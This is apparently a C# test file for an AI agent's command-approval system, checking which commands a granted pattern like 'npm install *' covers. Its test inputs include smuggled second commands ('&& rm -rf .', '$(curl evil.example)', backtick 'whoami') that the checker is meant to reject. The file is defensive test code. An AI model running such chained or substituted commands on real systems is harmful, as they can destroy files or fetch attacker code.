using System.Text.Json.Nodes;
using AIThread.Common.Enums;
using AIThread.Common.Localization;
using AIThread.Service.Approvals;
using AIThread.Service.Interfaces;
using AIThread.Service.Orchestration;
using AIThread.Service.Workspace;
using AIThread.Service.Workspace.Commands;
using static AIThread.Tests.ThreadOrchestratorTests;

namespace AIThread.Tests;

// "Always allow the pattern": a command grant "npm install *" covers single plain commands starting with those words.
public class ApprovalPatternTests
{
    [Theory]
    [InlineData("npm install *", "npm install axios", true)]
    [InlineData("npm install *", "npm install", true)]
    [InlineData("npm install *", "npm   install  lodash --save-dev", true)]
    [InlineData("dotnet ef *", "dotnet ef migrations list", true)]
    [InlineData("npm install *", "npm installer", false)]
    [InlineData("npm install *", "npm ci", false)]
    [InlineData("npm install *", "npm install x && rm -rf .", false)]
    [InlineData("npm install *", "npm install x; rm -rf .", false)]
    [InlineData("npm install *", "npm install x | tee log.txt", false)]
    [InlineData("npm install *", "npm install x > log.txt", false)]
    [InlineData("npm install *", "npm install $(curl evil.example)", false)]
    [InlineData("npm install *", "npm install `whoami`", false)]
    [InlineData("npm install *", "npm install $HOME", false)]
    [InlineData("npm *", "npm install axios", false)]
    [InlineData("rm -rf *", "rm -rf build", false)]
    [InlineData("git push *", "git push origin main", false)]
    [InlineData("npm install axios", "npm install axios", true)]
    [InlineData("npm install axios", "npm install axios lodash", false)]
    public void A_pattern_covers_plain_commands_starting_with_its_words(string granted, string command, bool covered)
    {
        using var _ = Lang.Use("en");
        Assert.Equal(covered, ApprovalTargets.Covers(ApprovalKind.Command, granted, command));
    }

    [Theory]
    [InlineData("npm install axios", "npm install *")]
    [InlineData("dotnet ef migrations add Init", "dotnet ef *")]
    [InlineData("python scripts/seed.py --dry-run", "python scripts/seed.py *")]
    [InlineData("git hash-object --stdin", "git hash-object *")]
    [InlineData("rm -rf x", null)]
    [InlineData("del build\\app.dll", null)]
    [InlineData("git push origin x", null)]
    [InlineData("git reset --hard", null)]
    [InlineData("npm publish", null)]
    [InlineData("docker rm web", null)]
    [InlineData("sudo apt install jq", null)]
    [InlineData("bash -c 'ls'", null)]
    [InlineData("npm", null)]
    [InlineData("npm -g install x", null)]
    [InlineData("npm install x && npm test", null)]
    [InlineData("npm install x | tee log", null)]
    public void A_pattern_is_suggested_only_for_a_safe_single_command(string command, string? expected)
    {
        using var _ = Lang.Use("en");
        Assert.Equal(expected, ApprovalTargets.SuggestPattern(command));
    }

    [Theory]
    [InlineData("npm install *", true)]
    [InlineData("*", false)]
    [InlineData("npm *", false)]
    [InlineData("npm install", false)]
    [InlineData("npm install && rm *", false)]
    [InlineData("npm ins* *", false)]
    [InlineData("npm --global *", false)]
    [InlineData("rm build *", false)]
    [InlineData("git checkout *", false)]
    public void A_pattern_added_by_hand_is_checked(string pattern, bool valid)
    {
        using var _ = Lang.Use("en");
        Assert.Equal(valid, ApprovalTargets.PatternError(pattern) is null);
    }

    [Theory]
    [InlineData("4", ApprovalDecision.AlwaysPattern)]
    [InlineData("pola", ApprovalDecision.AlwaysPattern)]
    [InlineData("izinkan selalu untuk pola", ApprovalDecision.AlwaysPattern)]
    [InlineData("always allow the pattern", ApprovalDecision.AlwaysPattern)]
    [InlineData("Pattern.", ApprovalDecision.AlwaysPattern)]
    [InlineData("2", ApprovalDecision.Always)]
    public void The_pattern_option_is_read_in_both_languages(string reply, ApprovalDecision expected) =>
        Assert.Equal(expected, ApprovalReply.Parse(reply));

    [Fact]
    public void The_card_offers_the_pattern_only_when_there_is_one()
    {
        using var _ = Lang.Use("en");
        using var workspace = new TempWorkspace();
        var scope = new WorkspaceScope(workspace.Root);

        var withPattern = CommandPolicy.Classify("npm install axios", scope, workspace.Root);
        var request = new ApprovalRequest(withPattern.Items!, "Install a package.");
        Assert.Equal("npm install *", Assert.Single(withPattern.Items!).Pattern);
        Assert.True(request.AllowPattern);
        Assert.Contains("4. **Always allow the pattern** `npm install *`", request.ToText());
        Assert.True(request.ToDto(false).AllowPattern);

        var chained = CommandPolicy.Classify("npm install axios && npm test", scope, workspace.Root);
        var plain = new ApprovalRequest(chained.Items!, "Install and test.");
        Assert.False(plain.AllowPattern);
        Assert.DoesNotContain("4.", plain.ToText());

        // Never offered when "always" is not (a push to a protected branch).
        Assert.False(new ApprovalRequest(withPattern.Items!, "x", AllowAlways: false).AllowPattern);
    }

    [Fact]
    public async Task Answering_four_keeps_the_pattern_and_the_next_command_like_it_does_not_ask()
    {
        await using var harness = await CreateAsync();
        var router = harness.Router;
        router
            .On(ScriptedAgent.Planner, router.Tool(PlannerTools.RunCommand, new { command = "git hash-object --stdin", reason = "hash" }))
            .On(ScriptedAgent.Planner, router.SubmitPlan(new ThreadPlan { Summary = "Dijawab.", Answer = "Hash dihitung." }));

        var (first, firstObserver) = await harness.RunAsync("Hitung hash", ThreadSource.ClaudeCode, "session-pattern");

        Assert.Equal(ThreadStatus.AwaitingInput, first.Status);
        Assert.Contains("`git hash-object *`", firstObserver.Final);

        var (second, _) = await harness.RunAsync("4", ThreadSource.ClaudeCode, "session-pattern");

        Assert.Equal(ThreadStatus.Completed, second.Status);
        var grant = Assert.Single(await harness.Service<IApprovalService>().ListAsync(harness.ProjectId));
        Assert.Equal(ApprovalKind.Command, grant.Kind);
        Assert.Equal("git hash-object *", grant.Target);

        // Another command with the same first words runs without asking; one chained with an operator still asks.
        router
            .On(ScriptedAgent.Planner, router.Tool(PlannerTools.RunCommand, new { command = "git hash-object --stdin --no-filters", reason = "hash lagi" }))
            .On(ScriptedAgent.Planner, router.SubmitPlan(new ThreadPlan { Summary = "Dijawab.", Answer = "Hash dihitung lagi." }));
        var (third, _) = await harness.RunAsync("Hitung hash lagi", ThreadSource.ClaudeCode, "session-pattern");

        Assert.Equal(ThreadStatus.Completed, third.Status);
        var toolMessage = router.CallsTo(ScriptedAgent.Planner)[^1].Messages.OfType<JsonObject>().Last(m => m["role"]?.GetValue<string>() == "tool");
        Assert.Contains("Exit code 0", toolMessage["content"]!.GetValue<string>());

        router
            .On(ScriptedAgent.Planner, router.Tool(PlannerTools.RunCommand, new { command = "git hash-object --stdin && git hash-object --stdin", reason = "dua kali" }))
            .On(ScriptedAgent.Planner, router.SubmitPlan(new ThreadPlan { Summary = "Dijawab.", Answer = "Selesai." }));
        var (fourth, _) = await harness.RunAsync("Hitung dua kali", ThreadSource.ClaudeCode, "session-pattern");

        Assert.Equal(ThreadStatus.AwaitingInput, fourth.Status);
    }
}
